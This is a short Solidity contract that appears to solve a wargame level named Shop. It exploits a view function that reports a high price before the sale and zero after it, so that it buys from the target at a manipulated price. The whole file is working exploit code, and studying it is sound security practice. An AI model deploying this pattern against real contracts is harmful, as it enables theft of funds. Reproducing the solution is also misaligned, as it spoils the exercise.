pragma solidity ^0.8.0;

import "../levels/Shop.sol";

contract ShopBreaker {
    Shop public immutable target;

    constructor(address shopAddress) {
        target = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        return (target.isSold() ? 0 : 101);
    }

    function attack() external {
        target.buy();
    }
}
